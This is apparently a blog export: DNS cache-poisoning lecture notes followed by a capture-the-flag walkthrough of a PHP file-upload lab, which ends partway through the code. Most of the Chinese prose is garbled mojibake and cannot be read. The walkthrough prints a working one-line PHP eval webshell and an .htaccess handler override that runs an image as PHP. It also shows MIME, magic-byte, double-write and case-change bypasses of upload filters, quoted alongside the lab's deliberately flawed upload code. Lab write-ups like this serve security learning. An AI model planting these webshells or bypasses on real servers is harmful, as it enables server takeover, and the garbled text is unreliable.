ä¸€ä¸ªåˆ†å¸ƒå¼çš„æ•°æ®åº“ç”¨æ¥å­˜å‚¨DNSä¿¡æ¯ï¼Œä»è€Œå®Œæˆä¸€ä¸ªDNSæœåŠ¡å™¨æ¶æ„  ä¸€ä¸ªåº”ç”¨å±‚çš„åè®®æ¥å‘æ‰€æœ‰ä¸»æœºæä¾›æ•°æ®åº“ä¿¡æ¯   ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦DNSï¼Ÿ ç†ç”±ä¹Ÿå¾ˆç®€å•ï¼Œå¥½è®°ï¼ç°åœ¨IPv4å·²ç»è¢«ç”¨å®Œäº†ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯æ›´é•¿çš„IPv6ï¼Œå¦‚æœæ¯è®¿é—®ä¸€ä¸ªç½‘ç«™éƒ½éœ€è¦è®°ä½IPåœ°å€å°±å¤ªéº»çƒ¦äº† DNSæœåŠ¡å™¨é‡‡ç”¨æ ‘çŠ¶ç»“æ„ å…¨ä¸–ç•Œä¸€å…±æœ‰13ä¸ªroot server é¡¶çº§åŸŸåTop level domain (TLD)  com,edu, org, net, gov .etc  cn, uk, de, eu, etc.   æœ¬åšå®¢ç›®å‰çš„åŸŸååç¼€åç¼€å°±æ˜¯org.cn DNS name resolution (iterative and recursive) DNSä¸»è¦çš„ä½œç”¨å°±æ˜¯map  Domain names to IP addresses  IP addresses to Domain names   DNS resolverå‘ nameservers è¿›è¡Œmappingè¯·æ±‚ï¼Œä¸€èˆ¬æˆ‘ä»¬å°†æŸ¥è¯¢è¯·æ±‚åˆ†ä¸ºä¸¤ç§   Iterative DNS query with caching è¿­ä»£æŸ¥è¯¢\né¡¾åæ€ä¹‰å°±æ˜¯ä¸€ä¸ªä¸ªDNSæœåŠ¡å™¨æŸ¥è¿‡æ¥ï¼Œä¸€ä¸ªæŸ¥ä¸åˆ°å°±ä¸‹ä¸€ä¸ª  Local DNS server  root DNS server  Top level DNS server  Authoritative DNS server        Recursive DNS query with caching é€’å½’æŸ¥è¯¢\nåŒæ ·ä¹Ÿæ˜¯æŒ‰æ¬¡åºæŸ¥è¯¢ï¼Œä½†æ˜¯ä¸åŒçš„åœ°æ–¹åœ¨äºï¼Œåªæœ‰æŸ¥åˆ°äº†æ‰ä¼šåŸè·¯è¿”å›ç»™ç”¨æˆ·ï¼Œå¦åˆ™å°±ä¼šç»§ç»­å°†æŸ¥è¯¢é€’äº¤ç»™ä¸‹ä¸€ä¸ªæœåŠ¡å™¨  æ³¨ï¼šä¸€èˆ¬æ¥è¯´ä¸ä¼šåœ¨å®é™…ä¸­ä½¿ç”¨   DNS caching Why we need DNS caching? é€šè¿‡ç¼“å­˜è¿™äº›DNSçš„mapä¿¡æ¯æ¥åŠ é€Ÿç½‘é¡µçš„è®¿é—® æ¯”å¦‚å·²ç»æŸ¥åˆ°è¿‡ä¸€æ¬¡è°·æ­Œçš„åŸŸåå’ŒIPåœ°å€çš„mapä¹‹åï¼Œå°±å­˜åœ¨æœ¬åœ°çš„DNS serverä¸Šï¼Œè¿™æ ·ä¸‹ä¸€æ¬¡å°±ä¸ç”¨èŠ±è¿™ä¹ˆå¤šæ­¥éª¤å†å»æŸ¥è¯¢äº† DNS cache poisoning attack é‚£ä¹ˆè¿™ç§å·æ‡’çš„åŠæ³•ä¹Ÿå°±ä¼šé­åˆ°é»‘å®¢çš„æ”»å‡»ï¼Œå¦‚æœåœ¨DNSæŸ¥è¯¢çš„è¿‡ç¨‹ä¸­ï¼Œé»‘å®¢å‘é€äº†ä¼ªé€ çš„DNSè®°å½•ç»™æœ¬åœ°çš„DNS serverï¼Œé‚£ä¹ˆæ—¢è€Œè¢«ç¼“å­˜åœ¨æœ¬åœ°ï¼Œé€ æˆé•¿ä¹…çš„æŸå®³ã€‚ åŒæ—¶è¿˜ä¼šç»™åŒä¸€åŒºåŸŸçš„å…¶ä»–è®¾å¤‡é€ æˆå±å®³ï¼Œè®°å¾—ä¹‹å‰æˆ‘ä»¬åœ¨SCTä¸­æåˆ°è¿‡çš„ Water holing attack å°±æ˜¯åˆ©ç”¨äº† DNS cache poisoning attack, é€šè¿‡è·å–ç»„ç»‡å†…æœ€é¢‘ç¹è®¿é—®çš„é¡µé¢ï¼Œå°±å¯ä»¥åˆ©ç”¨DNS poisoningæ¥å°†é‚£ä¸ªç½‘ç«™æ”¹ä¸ºé»‘å®¢æ‰€æ„å»ºçš„æ¶æ„ç½‘ç«™ï¼Œæ—¢è€Œè¾¾åˆ°å…¶æ”»å‡»ç›®çš„ How DNS poisoning attack worksï¼Ÿ é‚£ä¹ˆå…·ä½“æ˜¯å¦‚ä½•ä¼ªé€ çš„DNS queryå›å¤æ¥ä½¿DNS serverè®¤ä¸ºå…¶æ˜¯åˆæ³•çš„æŸ¥è¯¢ç»“æ„å¹¶ç¼“å­˜çš„å‘¢ï¼Ÿ è¿™é‡Œä¹Ÿæœ‰ä¸¤ç§æ‰‹æ®µ   Query QID attack\n  æ¯ä¸€ä¸ªDNS query éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ QID   DNSä½¿ç”¨UDPè¿›è¡Œé€šä¿¡   å› æ­¤ä¸å­˜åœ¨è¿æ¥çš„è¯´æ³•ï¼Œåªè¦èƒ½å¤Ÿé€‰å¯¹æ­£ç¡®çš„QIDï¼Œå°±èƒ½æˆåŠŸä»£æ›¿çœŸå®çš„å›å¤        RRSet attack\næ¯ä¸€ä¸ªDNS query response ä¼šåŒ…å«ä¸€ç»„è®°å½•é›†ï¼ŒResource Record Sets, or RRSets åŒæ—¶ï¼Œè¿™äº›è®°å½•é›†ä¸åªåŒ…å«mappingçš„entryï¼Œè¿˜å¯ä»¥å¢åŠ ä¸€äº›å…¶ä»–é¢å¤–çš„ä¿¡æ¯ï¼Œå¯¹æœªæ¥çš„mappingæœ‰æ‰€â€œå¸®åŠ©â€ æ¯”å¦‚åœ¨ä¸€æ¬¡é€’å½’æŸ¥è¯¢ä¸­ï¼Œä¸€èˆ¬ä¼šåŒ…å«åŸŸåçš„mappingå¯ä»¥åœ¨æŸä¸€ä¸ªæœåŠ¡å™¨ä¸Šè·å¾—ä¹‹ç±»çš„ä¿¡æ¯ï¼Œé»‘å®¢å°±å¯ä»¥é€‰æ‹©ç¯¡æ”¹è¿™ä¸ªä¿¡æ¯ï¼Œç›´æ¥æ”¹ä¸ºmappingçš„ä¿¡æ¯ï¼Œå°±å¯ä»¥è¾¾åˆ°å…¶é‡å®šå‘çš„ç›®çš„   ","date":"2022-04-28T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week_4_hijacking_and_poisoning/","title":"NSE Week4: Hijacking and poisoning"},{"content":"File Upload: ggctf-upload ã€Šå­¦äº†ä¸€å¤© file-uploadsä¹‹ç›´æ¥æ¢åˆ°å›½å…‰å¸ˆå‚…çš„é¶åœº.jpgã€‹ ä¸»è¦æ˜¯file-uploads çœ‹ä¸Šå»è¿˜æœ‰å¾ˆå¤šçš„ opençš„issueï¼Œæˆ‘è‡ªå·±é—¯å…³çš„æ—¶å€™ä¹Ÿç¢°åˆ°äº†å¾ˆå¤šé—®é¢˜ï¼Œåœ¨dockeré‡Œé¢å¾ˆå¤šç¯å¢ƒå†…å®¹æ”¹èµ·æ¥ä¹Ÿä¸èˆ’æœï¼Œåˆšå¥½çœ‹åˆ°å›½å…‰å¸ˆå‚…å†™çš„è¿™ä¸ªggctf-uploadï¼Œæœ‰é…å¥—çš„wpå¹¶ä¸”é•¿å¾—ä¹Ÿå¥½çœ‹å°±æ˜¯äº† JS ç¬¬ä¸€å…³æ˜¯ä¸€ä¸ªå‰ç«¯åç¼€åæ£€æŸ¥ç»•è¿‡ è§£æ³•ä¸€ï¼šæŠ“åŒ…ä¿®æ”¹ç™½åå• ç”¨Burpæ‹¦æˆªä¹‹åå¢åŠ phpåˆ°whitelistä¸­å°±å¥½äº†ï¼ˆç™½åå•å†å¼ºèƒ½è¢«æ”¹å°±æ˜¯ç™½ç»™233ï¼‰  ä¸Šä¼ æˆåŠŸï¼Œç”¨èšå‰‘è¿æ¥ä¸€ä¸‹è¯•è¯•ï¼ˆè¿™é‡Œå¯ä»¥åœ¨ç½‘é¡µæºç æˆ–è€…Burpçš„è¿”å›è¯·æ±‚ä¸­çœ‹åˆ°å›¾ç‰‡çš„é“¾æ¥ï¼Œå¦‚æœä¸´æ—¶æ–‡ä»¶å­˜æ”¾çš„åå­—è¢«æ”¹äº†å°±ç”¨å¾—ä¸Šï¼‰ ç”¨åˆ°çš„ä¸€å¥è¯æœ¨é©¬ \u0026lt;?php @eval($_POST[\u0026#34;a\u0026#34;]);?\u0026gt;PHPä¸­@çš„ä½œç”¨ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯å¯ä»¥å¿½ç•¥æ‰€æœ‰çš„é”™è¯¯ä¿¡æ¯ è§£æ³•äºŒï¼šç¦ç”¨JS åˆ©ç”¨æµè§ˆå™¨çš„é€‰é¡¹æˆ–è€…æ’ä»¶ç¦ç”¨JSä¹‹åï¼Œå®¢æˆ·ç«¯çš„è¿‡æ»¤å°±å¤±æ•ˆäº† è§£æ³•ä¸‰ï¼šJS debug åœ¨å®šä¹‰ç™½åå•å‡ºæ‰“ä¸Šæ–­ç‚¹ï¼Œç„¶ååˆ·æ–°ä¸€ä¸‹ï¼Œæ­¥è¿‡ä¹‹åä¿®æ”¹ç™½åå•çš„å†…å®¹å³å¯ï¼ˆchromeå¯ä»¥ç›´æ¥åœ¨è¾¹ä¸Šçš„Scopesä¸­æ”¹ï¼Œfirefoxç›´æ¥consoleå®šä¹‰ä¸€ä¸‹å³å¯ï¼‰  è§£æä¸Šä¼  è‡ªæœ¬æ–‡å®Œæˆï¼Œå›½å…‰çš„wpå¹¶æœªæ›´æ–°ç¬¬äºŒé¢˜ï¼Œä½†æ˜¯ç±»ä¼¼çš„åˆ©ç”¨å¾ˆå¤šï¼Œæœ¬æ–‡ä¸»è¦æ˜¯åˆ©ç”¨.htaccessçš„ç‰¹æ€§æ¥ä¿®æ”¹æœåŠ¡å™¨å¯¹äºæ–‡ä»¶çš„è§£ææ¥å®ç°ç»•è¿‡  .htaccessçš„ä½œç”¨ .htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸‹çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œä¸»è¦ç”¨äº ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½® å…¶ä½œç”¨åŸŸä¸ºå…¶æ‰€åœ¨ç›®å½•ä¸æ‰€æœ‰çš„å­ç›®å½•ï¼Œä½†æ˜¯å¦‚æœå­ç›®å½•ä¸­çš„ .htaccess ä¼šè¦†ç›–çˆ¶ç›®å½•çš„æ•ˆæœ   å› æ­¤æˆ‘ä»¬é€šè¿‡ä¸Šä¼ ä¸€ä¸ª .htaccess æ–‡ä»¶æ¥ä¿®æ”¹ upload ç›®å½•ä¸‹å¯¹äºæ–‡ä»¶çš„è§£ææ¥å®ç°ç»•è¿‡ ä»¥æ­¤ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶   .htaccess å°† trojan.jpg æ–‡ä»¶å½“ä½œ php æ¥è§£æ \u0026lt;!-- .htaccess --\u0026gt; \u0026lt;FilesMatch \u0026#34;trojan.jpg\u0026#34;\u0026gt; Sethandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt;   ä»¥åŠå«æœ‰ä¸€å¥è¯æœ¨é©¬çš„ trojan.jpg \u0026lt;?php @eval($_POST[\u0026#34;a\u0026#34;]);?\u0026gt;ä¹‹åå°±å¯ä»¥ç”¨èšå‰‘æµ‹è¯•è¿æ¥æˆåŠŸï¼ˆæˆ‘è¿™é‡Œå‘ç°æµ‹è¯•è¿æ¥æ€§ä¼šæŠ¥é”™ï¼Œä½†æ˜¯å®é™…æ·»åŠ äº†è¿æ¥æ˜¯å¯ä»¥è¿æ¥çš„ï¼‰ æ„Ÿè§‰å…¶å®è¦æ˜¯åƒupload-filesä¸€æ ·æŠŠæºç è´´å‡ºæ¥å°±å¥½äº†233 æœ€åæˆ‘ä»¬æ¥ä¸€èµ·çœ‹ä¸€ä¸‹phpæºç ï¼Œä¸»è¦æ˜¯åˆ©ç”¨äº†é»‘åå•è¿‡æ»¤æ‰€æœ‰çš„webshell if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $name = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); $ext = pathinfo($name)[\u0026#39;extension\u0026#39;]; $blacklist = array(\u0026#34;php\u0026#34;, \u0026#34;php7\u0026#34;, \u0026#34;php5\u0026#34;, \u0026#34;php4\u0026#34;, \u0026#34;php3\u0026#34;, \u0026#34;phtml\u0026#34;, \u0026#34;pht\u0026#34;, \u0026#34;jsp\u0026#34;, \u0026#34;jspa\u0026#34;, \u0026#34;jspx\u0026#34;, \u0026#34;jsw\u0026#34;, \u0026#34;jsv\u0026#34;, \u0026#34;jspf\u0026#34;, \u0026#34;jtml\u0026#34;, \u0026#34;asp\u0026#34;, \u0026#34;aspx\u0026#34;, \u0026#34;asa\u0026#34;, \u0026#34;asax\u0026#34;, \u0026#34;ascx\u0026#34;, \u0026#34;ashx\u0026#34;, \u0026#34;asmx\u0026#34;, \u0026#34;cer\u0026#34;, \u0026#34;swf\u0026#34;); if (!in_array($ext, $blacklist)) { if (move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], UPLOAD_PATH . $name)) { $is_upload = true; } else { echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } } else { echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } }  basename() basename(string $path, string $suffix = \u0026ldquo;\u0026rdquo;): string path: æ–‡ä»¶è·¯å¾„ suffix: æ–‡ä»¶åç¼€ return: æ–‡ä»¶åï¼ˆæœ‰/æ— åç¼€ï¼‰  pathinfo pathinfo(string $path, int $flags = PATHINFO_ALL): array|string path: æ–‡ä»¶è·¯å¾„ flags: æŒ‡å®šéœ€è¦è¿”å›çš„å†…å®¹{dirname, basename, extension, filename} return: æ ¹æ®flagså†³å®š, å¤šä¸ªå†…å®¹çš„è¯å°±ä¼šè¿”å›æ•°ç»„ï¼ˆé»˜è®¤å…¨éƒ¨ï¼‰   MIME ç»•è¿‡ é¦–å…ˆæˆ‘ä»¬æ ¹æ®æç¤ºä¿¡æ¯æ¥è®¤è¯†ä¸€ä¸‹ MIME åª’ä½“ç±»å‹ï¼ˆé€šå¸¸ç§°ä¸º Multipurpose Internet Mail Extensions æˆ– MIME ç±»å‹ ï¼‰æ˜¯ä¸€ç§æ ‡å‡†ï¼Œç”¨æ¥è¡¨ç¤ºæ–‡æ¡£ã€æ–‡ä»¶æˆ–å­—èŠ‚æµçš„æ€§è´¨å’Œæ ¼å¼ã€‚ MIMEçš„ç»„æˆç»“æ„éå¸¸ç®€å•ï¼›ç”±ç±»å‹ä¸å­ç±»å‹ä¸¤ä¸ªå­—ç¬¦ä¸²ä¸­é—´ç”¨ \u0026lsquo;/\u0026rsquo; åˆ†éš”è€Œç»„æˆã€‚ä¸å…è®¸ç©ºæ ¼å­˜åœ¨ã€‚  type è¡¨ç¤ºå¯ä»¥è¢«åˆ†å¤šä¸ªå­ç±»çš„ç‹¬ç«‹ç±»åˆ«ã€‚  subtype è¡¨ç¤ºç»†åˆ†åçš„æ¯ä¸ªç±»å‹   é€šç”¨çš„ç»“æ„ä¸ºï¼š type/subtype MIMEç±»å‹å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œä½†æ˜¯ä¼ ç»Ÿå†™æ³•éƒ½æ˜¯å°å†™ã€‚ ç„¶åæŸ¥çœ‹æºç  if (!empty($_POST[\u0026#39;submit\u0026#39;])) { if (!in_array($_FILES[\u0026#39;file\u0026#39;][\u0026#39;type\u0026#39;], [\u0026#34;image/jpeg\u0026#34;, \u0026#34;image/png\u0026#34;, \u0026#34;image/gif\u0026#34;, \u0026#34;image/jpg\u0026#34;])) { echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } else { $name = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); if (move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], UPLOAD_PATH . $name)) { $is_upload = true; } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;ä¸Šä¼ å¤±è´¥\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; } } } è¿™é‡Œæ£€æŸ¥çš„æ–¹å¼æ˜¯æ£€æŸ¥ $_FILES['file']['type'] çš„å€¼ï¼Œè¿™é‡Œæˆ‘ä»¬æ¥å­¦ä¹ ä¸€ä¸‹PHPçš„ superglobals: $_FILES,ä»¥åŠå…¶ç›¸å…³çš„ç”¨æ³•  $_FILES PHPå®˜ç½‘ï¼š\u0026ldquo;An associative array of items uploaded to the current script via the HTTP POST method.\u0026rdquo; å³ä¸€ä¸ªå­˜æ”¾æ‰€æœ‰é€šè¿‡ POST æ–¹æ³•ä¸Šä¼ çš„æ–‡ä»¶ä¿¡æ¯çš„æ•°ç»„   ç„¶åæˆ‘ä»¬æ¥çœ‹çœ‹ POST ä¸Šä¼ ä¸­æ‰€åŒ…å«æ–‡ä»¶çš„ä¿¡æ¯  $_FILES[\u0026lsquo;userfile\u0026rsquo;][\u0026rsquo;name\u0026rsquo;] ä»å®¢æˆ·ç«¯ä¸Šä¼ çš„æ–‡ä»¶çš„åŸå§‹åå­—  $_FILES[\u0026lsquo;userfile\u0026rsquo;][\u0026rsquo;type\u0026rsquo;] æ–‡ä»¶çš„MIME typesï¼Œ  $_FILES[\u0026lsquo;userfile\u0026rsquo;][\u0026lsquo;size\u0026rsquo;] æ–‡ä»¶çš„å¤§å°(bytes)  $_FILES[\u0026lsquo;userfile\u0026rsquo;][\u0026rsquo;tmp_name\u0026rsquo;] ç”¨äºå­˜å‚¨æ–‡ä»¶å°†è¦å­˜æ”¾åœ¨serverçš„ä¸´æ—¶åå­—  $_FILES[\u0026lsquo;userfile\u0026rsquo;][\u0026rsquo;error\u0026rsquo;] ä¸Šä¼ å¤±è´¥çš„é”™è¯¯ä¿¡æ¯  $_FILES[\u0026lsquo;userfile\u0026rsquo;][\u0026lsquo;full_path\u0026rsquo;] æµè§ˆå™¨æäº¤çš„å®Œæ•´è·¯å¾„? PHP8.1.0æ”¯æŒ   æ¥ç€æˆ‘ä»¬æ¥çœ‹æœ¬æ¬¡æ–‡ä»¶ä¸Šä¼ çš„HTTPè¯·æ±‚ æ˜¯ä¸æ˜¯èƒ½å‘ç°æˆ‘ä»¬åˆšåˆšæåˆ°è¿‡çš„ $_FILES çš„ä¿¡æ¯ï¼Ÿ userfile = \u0026ldquo;file\u0026rdquo; $_FILES[\u0026lsquo;userfile\u0026rsquo;][\u0026rsquo;type\u0026rsquo;] = \u0026ldquo;text/php\u0026rdquo; $_FILES[\u0026lsquo;userfile\u0026rsquo;][\u0026rsquo;name\u0026rsquo;] = \u0026ldquo;trojan.php\u0026rdquo; å› æ­¤æˆ‘ä»¬é€šè¿‡æŠ“åŒ…åä¿®æ”¹ MIME æ ¼å¼ä¸ºç™½åå•ä¸­çš„ä»»æ„ä¸€ä¸ªå›¾ç‰‡æ ¼å¼å³å¯ç»•è¿‡ èšå‰‘è¿æ¥æµ‹è¯•æˆåŠŸ  æ–‡ä»¶å¤´ç»•è¿‡ é¢˜ç›®æç¤ºç»™çš„ä¿¡æ¯å·²ç»å¾ˆå¤šå…¨é¢äº†ï¼Œæ¯ä¸€ä¸ªæ–‡ä»¶çš„å¼€å¤´éƒ½å­˜æ”¾äº†å“åº”çš„æ ¼å¼æŒ‡ç¤ºï¼Œå› æ­¤æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶å¤´æ¥å®ç°ç»•è¿‡ æ¥ç€æˆ‘ä»¬ç»“åˆæºç æ¥çœ‹ï¼Œåå°é¦–å…ˆè¿˜æ˜¯æ£€æµ‹äº†ä¸Šé¢˜çš„ MIME ç±»å‹ï¼Œéœ€è¦ä¿®æ”¹ä¸€ä¸‹ï¼Œæ¥ç€æ ¡éªŒäº†ä¸‰ä¸ªå›¾ç‰‡æ ¼å¼çš„æ–‡ä»¶å¤´æ˜¯å¦å­˜åœ¨äºæ–‡ä»¶å†… if (!in_array($_FILES[\u0026#39;file\u0026#39;][\u0026#39;type\u0026#39;], [\u0026#34;image/jpeg\u0026#34;, \u0026#34;image/jpg\u0026#34;, \u0026#34;image/png\u0026#34;, \u0026#34;image/gif\u0026#34;])) { echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } else if (!in_array(bin2hex($bin), [\u0026#34;89504E47\u0026#34;, \u0026#34;FFD8FFE0\u0026#34;, \u0026#34;47494638\u0026#34;])) { echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } else { $name = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); if (move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], UPLOAD_PATH . $name)) { $is_upload = true; } else { echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } } é‚£æˆ‘ä»¬åªéœ€è¦ç”¨Burpæˆªå–è¯·æ±‚ä¹‹åï¼Œä¿®æ”¹MIMEç±»å‹ä»¥åŠåŠ ä¸Šæ–‡ä»¶å¤´å³å¯ èšå‰‘è¿æ¥æˆåŠŸ JPEG (jpg)ï¼Œæ–‡ä»¶å¤´ï¼šFFD8FFï¼Œ Ã¿Ã˜Ã¿ PNG (png)ï¼Œæ–‡ä»¶å¤´ï¼š89504E47ï¼Œ .PNG GIF (gif)ï¼Œæ–‡ä»¶å¤´ï¼š47494638ï¼Œ GIF8 HTML (html)ï¼Œæ–‡ä»¶å¤´ï¼š68746D6C3E, html\u0026gt; ZIP Archive (zip)ï¼Œæ–‡ä»¶å¤´ï¼š504B0304, PK.. RAR Archive (rar)ï¼Œæ–‡ä»¶å¤´ï¼š52617221, Rar! Adobe Acrobat (pdf)ï¼Œæ–‡ä»¶å¤´ï¼š255044462D312E, %PDF-1. MS Word/Excel (xls.or.doc)ï¼Œæ–‡ä»¶å¤´ï¼šD0CF11E0, ÃÃ.Ã  æœ‰ç¼ºé™·çš„ä»£ç 1 æ ¹æ®é¢˜ç›®æç¤ºç»“åˆæºç ï¼Œæˆ‘ä»¬å¾—çŸ¥è¿™é‡Œç”¨äº†ä¸€ä¸ªé»‘åå•æ¥è¿‡æ»¤æ‰€æœ‰çš„webshellä»¥åŠhtaccessåç¼€çš„æ–‡ä»¶ï¼ŒçŒœæµ‹ç»•è¿‡å¯èƒ½å‘ç”Ÿåœ¨æ–¹æ³• str_ireplace èº«ä¸Š if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $name = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); $blacklist = array(\u0026#34;php\u0026#34;, \u0026#34;php5\u0026#34;, \u0026#34;php4\u0026#34;, \u0026#34;php3\u0026#34;, \u0026#34;phtml\u0026#34;, \u0026#34;pht\u0026#34;, \u0026#34;jsp\u0026#34;, \u0026#34;jspa\u0026#34;, \u0026#34;jspx\u0026#34;, \u0026#34;jsw\u0026#34;, \u0026#34;jsv\u0026#34;, \u0026#34;jspf\u0026#34;, \u0026#34;jtml\u0026#34;, \u0026#34;asp\u0026#34;, \u0026#34;aspx\u0026#34;, \u0026#34;asa\u0026#34;, \u0026#34;asax\u0026#34;, \u0026#34;ascx\u0026#34;, \u0026#34;ashx\u0026#34;, \u0026#34;asmx\u0026#34;, \u0026#34;cer\u0026#34;, \u0026#34;swf\u0026#34;, \u0026#34;htaccess\u0026#34;, \u0026#34;ini\u0026#34;); $name = str_ireplace($blacklist, \u0026#34;\u0026#34;, $name); if (move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], UPLOAD_PATH . $name)) { $is_upload = true; } else { echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } } æ ¹æ®ä»¥å‰ç»•è¿‡ç±»ä¼¼é»‘åå•çš„ç»å†ï¼Œè¿™é‡Œçš„ str_ireplace ç®€å•çš„å°†æ‰€æœ‰çš„åŒ¹é…æ›¿æ¢ä¸ºç©ºï¼Œéå¸¸çš„å±é™©ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¤å†™æ‹¼æ¥çš„æ‰‹æ®µæ¥è¿›è¡Œç»•è¿‡è¿‡æ»¤ ä¾‹å¦‚ pphphp ç¬¬ä¸€ä¸ªç¢°åˆ°çš„phpè¢«æ›¿æ¢ä¹‹åï¼Œå°±å¯ä»¥å½¢æˆä¸€ä¸ªå®Œæ•´çš„phpåç¼€äº†  èšå‰‘è¿æ¥æµ‹è¯•æˆåŠŸ æœ‰ç¼ºé™·çš„ä»£ç 2 å› ä¸ºæç¤ºä¸ä¸Šä¸€é¢˜åŸºæœ¬ç±»ä¼¼ï¼Œä¸è¿‡æåˆ°äº†æ‰‹åŠ¨æ”¹æˆäº†Windowsçš„ç‰¹æ€§ï¼Œå› æ­¤æˆ‘ä»¬ç›´æ¥ä¸€èµ·æ¥çœ‹ä¸€ä¸‹æºç å§ if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $name = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); $blacklist = array(\u0026#34;php\u0026#34;, \u0026#34;php5\u0026#34;, \u0026#34;php4\u0026#34;, \u0026#34;php3\u0026#34;, \u0026#34;phtml\u0026#34;, \u0026#34;pht\u0026#34;, \u0026#34;jsp\u0026#34;, \u0026#34;jspa\u0026#34;, \u0026#34;jspx\u0026#34;, \u0026#34;jsw\u0026#34;, \u0026#34;jsv\u0026#34;, \u0026#34;jspf\u0026#34;, \u0026#34;jtml\u0026#34;, \u0026#34;asp\u0026#34;, \u0026#34;aspx\u0026#34;, \u0026#34;asa\u0026#34;, \u0026#34;asax\u0026#34;, \u0026#34;ascx\u0026#34;, \u0026#34;ashx\u0026#34;, \u0026#34;asmx\u0026#34;, \u0026#34;cer\u0026#34;, \u0026#34;swf\u0026#34;, \u0026#34;htaccess\u0026#34;, \u0026#34;ini\u0026#34;); $name = str_replace($blacklist, \u0026#34; \u0026#34;, $name); if (move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], UPLOAD_PATH . $name)) { $is_upload = true; } else { echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } } å‘ç°è¿™æ¬¡çš„ str_replace() æ–¹æ³•æ›¿æ¢çš„æ˜¯ç©ºæ ¼ï¼Œå› æ­¤æ²¡åŠæ³•ç”¨ä¸Šä¸€éçš„å¥—è·¯ ä»”ç»†ä¸€çœ‹ï¼Œæ­¤replaceéå½¼replaceï¼Œè¿™ä¸ª str_replace æ˜¯case sensitiveè€Œå‰ä¸€ä¸ªçš„ str_ireplace æŒ‡çš„å°±æ˜¯ case insensitive é‚£ä¹ˆæˆ‘ä»¬ç”¨ Php å³å¯å®Œæˆç»•è¿‡ ä½†æ˜¯å°±åƒæç¤ºæ‰€è¯´çš„é‚£æ ·ï¼Œè¿™é¢˜å®é™…ç”¨èšå‰‘æ˜¯æ²¡æœ‰åŠæ³•æˆåŠŸè¿æ¥çš„ï¼Œå› ä¸ºæ¯•ç«Ÿåªæ˜¯æ¨¡æ‹Ÿwindowsç¯å¢ƒï¼Œæœ¬è´¨ä¸Šè¿˜æ˜¯linuxï¼Œä¸å­˜åœ¨è¿™æ ·çš„æ¼æ´ å¤è€çš„æ¼æ´ - 1 æ ¹æ®æœ¬é¢˜çš„æç¤ºï¼Œè¿™æ˜¯ä¸€ä¸ª00æ¼æ´ï¼Œè¯´å…¶å¤è€ä¸»è¦æ˜¯å› ä¸ºåªæœ‰åœ¨PHPç‰ˆæœ¬å°äº5.3.4ç‰ˆæœ¬æ‰æœ‰æ•ˆï¼Œå¹¶ä¸”è¦æ±‚magic_quotes_gpc = Offçš„æƒ…å†µï¼ˆæˆ‘ä»¬åœ¨sqli-labsçš„å­¦ä¹ ä¸­çœ‹åˆ°è¿‡è¿™ä¸ªï¼‰ ç»“åˆæºç æ¥çœ‹ï¼Œè¿™é‡Œç”¨äº†ä¸€ä¸ªä¸¥æ ¼çš„ç™½åå•è¿‡æ»¤ï¼Œå¹¶ä¸”åˆ©ç”¨éšæœºä¸´æ—¶æ–‡ä»¶åï¼Œè®©æˆ‘ä»¬æ— æ³•ä½¿ç”¨ htaccess æ¥ä¿®æ”¹æŒ‡å®šæ–‡ä»¶çš„é…ç½® if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $name = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); $info = pathinfo($name); $ext = $info[\u0026#39;extension\u0026#39;]; $whitelist = array(\u0026#34;jpg\u0026#34;, \u0026#34;jpeg\u0026#34;, \u0026#34;png\u0026#34;, \u0026#34;gif\u0026#34;); if (in_array($ext, $whitelist)) { $filename = rand(10, 99) . date(\u0026#34;YmdHis\u0026#34;) . \u0026#34;.\u0026#34; . $ext; $des = $_GET[\u0026#39;road\u0026#39;] . \u0026#34;/\u0026#34; . $filename; if (move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], $des)) { $is_upload = true; } else { echo 